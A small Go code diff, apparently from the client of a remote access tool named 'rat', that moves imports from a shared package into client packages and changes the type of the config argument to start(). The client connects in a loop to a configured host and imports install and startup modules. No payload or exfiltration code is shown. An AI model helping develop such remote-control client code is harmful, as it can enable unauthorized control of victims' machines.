@@ -7,9 +7,9 @@ import (
 	"os/exec"
 	"rat/client/install"
 	"rat/client/startup"
-	"rat/shared"
-	"rat/shared/installpath"
-	"rat/shared/network"
+
+	"rat/client/installpath"
+	"rat/client/network"
 	"time"
 )
 
@@ -46,7 +46,7 @@ func main() {
 	start(Config)
 }
 
-func start(config shared.BinaryConfig) {
+func start(config BinaryConfig) {
 	for {
 		host := config.Host
 		fmt.Println("Connecting to", host)
